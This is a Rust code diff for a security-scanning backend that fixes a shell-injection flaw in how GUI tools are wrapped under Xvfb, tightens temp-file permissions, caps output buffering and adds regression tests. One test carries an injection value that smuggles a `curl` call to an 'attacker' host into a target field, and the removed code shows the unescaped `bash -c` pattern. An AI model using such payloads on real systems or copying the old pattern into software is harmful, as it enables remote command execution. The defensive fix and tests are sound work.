@@ -11,6 +11,33 @@ use nix::unistd::Pid;
 use super::parsers::parse_output;
 use super::tool_registry::{build_command, get_tool_max_runtime_secs};
 
+/// Hard cap on how much scan output is buffered in memory per scan.
+///
+/// STABILITY: previously `output` grew without any bound. A chatty tool
+/// (masscan on a wide range, ffuf, a binary dump) could allocate gigabytes in
+/// the backend process. With no container memory limit on the scan engine and
+/// `vm.overcommit_memory=1` on the host, this was able to wedge the whole
+/// machine. 8 MiB is far more than any report needs.
+const MAX_OUTPUT_BYTES: usize = 8 * 1024 * 1024;
+
+/// Appends a line to `buf` while respecting [`MAX_OUTPUT_BYTES`].
+///
+/// Returns `true` the first time the cap is hit so the caller can emit a single
+/// truncation notice instead of one per line.
+fn push_line_capped(buf: &mut String, line: &str, truncated: &mut bool) -> bool {
+    if *truncated {
+        return false;
+    }
+    if buf.len() + line.len() + 1 > MAX_OUTPUT_BYTES {
+        buf.push_str("\n...[output truncated: exceeded 8 MiB cap]\n");
+        *truncated = true;
+        return true;
+    }
+    buf.push_str(line);
+    buf.push('\n');
+    false
+}
+
 #[allow(dead_code)]
 pub struct ScanResult {
     pub output: String,
@@ -45,18 +72,18 @@ pub async fn execute_scan(
     // Build the command
     let (mut program, mut args) = build_command(tool_name, target, command_template)?;
 
-    // Wrap GUI tools with Xvfb virtual framebuffer for headless execution
+    // Wrap GUI tools with Xvfb virtual framebuffer for headless execution.
+    //
+    // SECURITY: never build a shell string here. The previous implementation did
+    // `bash -c "<program> <args joined by spaces>"` with no escaping, so a target
+    // or parameter containing shell metacharacters (`&` was not on the blocklist)
+    // executed arbitrary commands. `xvfb-run` execs the command directly, so we
+    // pass program + args as separate argv entries and no shell is involved.
     if is_gui_tool {
-        let original_cmd = format!("{} {}", program, args.join(" "));
-        program = "xvfb-run".to_string();
-        args = vec![
-            "--auto-servernum".to_string(),
-            "--server-args=-screen 0 1024x768x24".to_string(),
-            "bash".to_string(),
-            "-c".to_string(),
-            original_cmd,
-        ];
-        tracing::info!("GUI tool wrapped with Xvfb: {} {}", program, args.join(" "));
+        let (p, a) = wrap_gui_command(&program, &args);
+        program = p;
+        args = a;
+        tracing::info!("GUI tool wrapped with Xvfb (no shell): {} {:?}", program, args);
     }
 
     let (actual_program, actual_args, execution_mode, askpass_file) = if let Some(ssh) = &agent_ssh {
@@ -75,11 +102,20 @@ pub async fn execute_scan(
             ssh_args.push("-o".to_string());
             ssh_args.push(format!("FingerprintHash=sha256"));
             // Write known_hosts entry to a temp file
-            let known_hosts_content = format!("[{}]:{} {}", ssh.ssh_host, ssh.ssh_port, fp);
+            let known_hosts_content = format!("[{}]:{} {}\n", ssh.ssh_host, ssh.ssh_port, fp);
             let tmp_path = format!("/tmp/cybersec_known_hosts_{}", uuid::Uuid::new_v4());
-            if tokio::fs::write(&tmp_path, known_hosts_content).await.is_ok() {
+            // Create 0600 up front (never world-readable, not even briefly).
+            if write_private_file(&tmp_path, &known_hosts_content).await.is_ok() {
                 ssh_args.push("-o".to_string());
                 ssh_args.push(format!("UserKnownHostsFile={}", tmp_path));
+                // CLEANUP: these files were never removed and accumulated in /tmp
+                // forever. SSH only reads known_hosts during the handshake, so a
+                // short delay is safe even for long-running scans.
+                let doomed = tmp_path.clone();
+                tokio::spawn(async move {
+                    tokio::time::sleep(std::time::Duration::from_secs(120)).await;
+                    let _ = tokio::fs::remove_file(&doomed).await;
+                });
             }
         } else {
             // No fingerprint stored — refuse connection for security
@@ -100,8 +136,11 @@ pub async fn execute_scan(
             if !pp.is_empty() {
                 let ap = format!("/tmp/cybersec_askpass_{}", uuid::Uuid::new_v4());
                 let esc = pp.replace('\'', "'\\''");
-                if tokio::fs::write(&ap, format!("#!/bin/sh\necho '{}'\n", esc)).await.is_ok() {
-                    let _ = tokio::fs::set_permissions(&ap, std::os::unix::fs::PermissionsExt::from_mode(0o700)).await;
+                // RACE FIX: the file used to be written with the default umask
+                // (typically 0644) and only chmod'ed to 0700 afterwards, leaving a
+                // window where any local user could read the SSH key passphrase.
+                // It is now created 0700 atomically.
+                if write_private_file_mode(&ap, &format!("#!/bin/sh\necho '{}'\n", esc), 0o700).await.is_ok() {
                     askpass_path = Some(ap);
                 }
             }
@@ -170,6 +209,8 @@ pub async fn execute_scan(
     let mut output = String::new();
     let mut stderr_output = String::new();
     let mut stderr_done = false;
+    let mut stdout_truncated = false;
+    let mut stderr_truncated = false;
 
     let tx_clone = tx.clone();
     let scan_id_owned = scan_id.to_string();
@@ -203,8 +244,9 @@ pub async fn execute_scan(
                 // Only read stdout
                 match stdout_reader.next_line().await {
                     Ok(Some(line)) => {
-                        output.push_str(&line);
-                        output.push('\n');
+                        if push_line_capped(&mut output, &line, &mut stdout_truncated) {
+                            tracing::warn!("scan {} output hit {} byte cap; truncating", scan_id_owned, MAX_OUTPUT_BYTES);
+                        }
                         let _ = tx_clone.send(serde_json::json!({
                             "type": "output",
                             "scan_id": scan_id_owned,
@@ -223,8 +265,9 @@ pub async fn execute_scan(
                     line = stdout_reader.next_line() => {
                         match line {
                             Ok(Some(line)) => {
-                                output.push_str(&line);
-                                output.push('\n');
+                                if push_line_capped(&mut output, &line, &mut stdout_truncated) {
+                                    tracing::warn!("scan {} output hit {} byte cap; truncating", scan_id_owned, MAX_OUTPUT_BYTES);
+                                }
                                 let _ = tx_clone.send(serde_json::json!({
                                     "type": "output",
                                     "scan_id": scan_id_owned,
@@ -242,8 +285,7 @@ pub async fn execute_scan(
                     line = stderr_reader.next_line() => {
                         match line {
                             Ok(Some(line)) => {
-                                stderr_output.push_str(&line);
-                                stderr_output.push('\n');
+                                push_line_capped(&mut stderr_output, &line, &mut stderr_truncated);
                             }
                             Ok(None) => { stderr_done = true; }
                             Err(_) => { stderr_done = true; }
@@ -256,6 +298,11 @@ pub async fn execute_scan(
     .await;
 
     if result.is_err() {
+        // LEAK FIX: the heartbeat task must be aborted on *every* exit path.
+        // Previously this early return skipped `heartbeat_handle.abort()`, so a
+        // timed-out scan left a task looping forever, broadcasting SSE frames
+        // for a dead scan — one leaked task per timeout.
+        heartbeat_handle.abort();
         // Timeout — kill the entire process group (not just direct child)
         // Guard: never send signal to PID 0 (would kill entire process group of the server)
         if child_pid > 0 {
@@ -307,11 +354,177 @@ pub async fn execute_scan(
     })
 }
 
+/// Wraps a command for headless execution under Xvfb.
+///
+/// Returns `(program, argv)` where every original argument stays a **separate**
+/// argv entry. `xvfb-run` execs the target directly, so no shell ever parses
+/// these strings — a target containing `&`, `;` or `$()` is passed through as a
+/// literal argument instead of being interpreted.
+fn wrap_gui_command(program: &str, args: &[String]) -> (String, Vec<String>) {
+    let mut out = Vec::with_capacity(args.len() + 3);
+    out.push("--auto-servernum".to_string());
+    out.push("--server-args=-screen 0 1024x768x24".to_string());
+    out.push(program.to_string());
+    out.extend(args.iter().cloned());
+    ("xvfb-run".to_string(), out)
+}
+
+/// Writes `content` to `path`, creating it with mode 0600 atomically.
+async fn write_private_file(path: &str, content: &str) -> std::io::Result<()> {
+    write_private_file_mode(path, content, 0o600).await
+}
+
+/// Writes `content` to `path`, creating it with the given mode atomically.
+///
+/// Using `OpenOptions::mode` means the file never exists with looser
+/// permissions, unlike `write()` followed by `set_permissions()`.
+async fn write_private_file_mode(path: &str, content: &str, mode: u32) -> std::io::Result<()> {
+    use std::os::unix::fs::OpenOptionsExt;
+    use tokio::io::AsyncWriteExt;
+    let mut f = tokio::fs::OpenOptions::new()
+        .write(true)
+        .create_new(true)
+        .mode(mode)
+        .open(path)
+        .await?;
+    f.write_all(content.as_bytes()).await?;
+    f.flush().await
+}
+
 /// Escape a string for safe inclusion in a remote shell command
 fn shell_escape(s: &str) -> String {
     if s.chars().all(|c| c.is_alphanumeric() || c == '-' || c == '_' || c == '.' || c == '/' || c == ':') {
         s.to_string()
     } else {
         format!("'{}'", s.replace('\'', "'\\''"))
+    }
+}
+
+// ── Tests ──────────────────────────────────────────────────
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    // ── push_line_capped (#29: unbounded output buffer) ───────────────
+
+    #[test]
+    fn push_line_capped_appends_normal_lines() {
+        let mut buf = String::new();
+        let mut trunc = false;
+        assert!(!push_line_capped(&mut buf, "hello", &mut trunc));
+        assert!(!push_line_capped(&mut buf, "world", &mut trunc));
+        assert_eq!(buf, "hello\nworld\n");
+        assert!(!trunc);
+    }
+
+    #[test]
+    fn push_line_capped_stops_at_the_cap() {
+        let mut buf = String::new();
+        let mut trunc = false;
+        let chunk = "x".repeat(64 * 1024);
+        let mut hit = false;
+        // Far more than MAX_OUTPUT_BYTES worth of data.
+        for _ in 0..256 {
+            if push_line_capped(&mut buf, &chunk, &mut trunc) {
+                hit = true;
+            }
+        }
+        assert!(hit, "cap should have been reported");
+        assert!(trunc, "truncation flag should be set");
+        assert!(
+            buf.len() <= MAX_OUTPUT_BYTES + 64,
+            "buffer grew past the cap: {} bytes",
+            buf.len()
+        );
+        assert!(buf.ends_with("...[output truncated: exceeded 8 MiB cap]\n"));
+    }
+
+    #[test]
+    fn push_line_capped_reports_truncation_only_once() {
+        let mut buf = String::new();
+        let mut trunc = false;
+        let chunk = "y".repeat(1024 * 1024);
+        let reports = (0..32)
+            .filter(|_| push_line_capped(&mut buf, &chunk, &mut trunc))
+            .count();
+        assert_eq!(reports, 1, "truncation must be reported exactly once");
+    }
+
+    #[test]
+    fn push_line_capped_ignores_writes_after_truncation() {
+        let mut buf = String::new();
+        let mut trunc = true; // already truncated
+        assert!(!push_line_capped(&mut buf, "ignored", &mut trunc));
+        assert!(buf.is_empty());
+    }
+
+    // ── wrap_gui_command (#9: shell injection via GUI tools) ──────────
+
+    #[test]
+    fn wrap_gui_command_never_invokes_a_shell() {
+        let (prog, args) = wrap_gui_command("wireshark", &["-i".into(), "eth0".into()]);
+        assert_eq!(prog, "xvfb-run");
+        assert!(
+            !args.iter().any(|a| a == "bash" || a == "sh" || a == "-c"),
+            "no shell may appear in argv: {args:?}"
+        );
+    }
+
+    #[test]
+    fn wrap_gui_command_keeps_arguments_separate() {
+        let (_, args) = wrap_gui_command("tool", &["-t".into(), "example.com".into()]);
+        assert_eq!(
+            args,
+            vec![
+                "--auto-servernum".to_string(),
+                "--server-args=-screen 0 1024x768x24".to_string(),
+                "tool".to_string(),
+                "-t".to_string(),
+                "example.com".to_string(),
+            ]
+        );
+    }
+
+    #[test]
+    fn wrap_gui_command_passes_metacharacters_through_literally() {
+        // Regression: the old implementation joined argv with spaces into
+        // `bash -c`, so this target executed `curl` as a second command.
+        let evil = "example.com & curl http://attacker/";
+        let (prog, args) = wrap_gui_command("nmap", &[evil.to_string()]);
+        assert_eq!(prog, "xvfb-run");
+        assert_eq!(
+            args.last().map(String::as_str),
+            Some(evil),
+            "the metacharacter payload must survive as ONE literal argv entry"
+        );
+        assert_eq!(
+            args.iter().filter(|a| a.contains("curl")).count(),
+            1,
+            "payload must not be split into a separate command"
+        );
+    }
+
+    // ── shell_escape (SSH remote command construction) ────────────────
+
+    #[test]
+    fn shell_escape_leaves_safe_strings_untouched() {
+        assert_eq!(shell_escape("nmap"), "nmap");
+        assert_eq!(shell_escape("/usr/bin/nmap"), "/usr/bin/nmap");
+        assert_eq!(shell_escape("example.com"), "example.com");
+        assert_eq!(shell_escape("https://example.com:443"), "https://example.com:443");
+    }
+
+    #[test]
+    fn shell_escape_quotes_metacharacters() {
+        assert_eq!(shell_escape("a;b"), "'a;b'");
+        assert_eq!(shell_escape("a b"), "'a b'");
+        assert_eq!(shell_escape("$(id)"), "'$(id)'");
+        assert_eq!(shell_escape("a&b"), "'a&b'");
+    }
+
+    #[test]
+    fn shell_escape_neutralises_embedded_single_quotes() {
+        assert_eq!(shell_escape("it's"), r#"'it'\''s'"#);
     }
 }
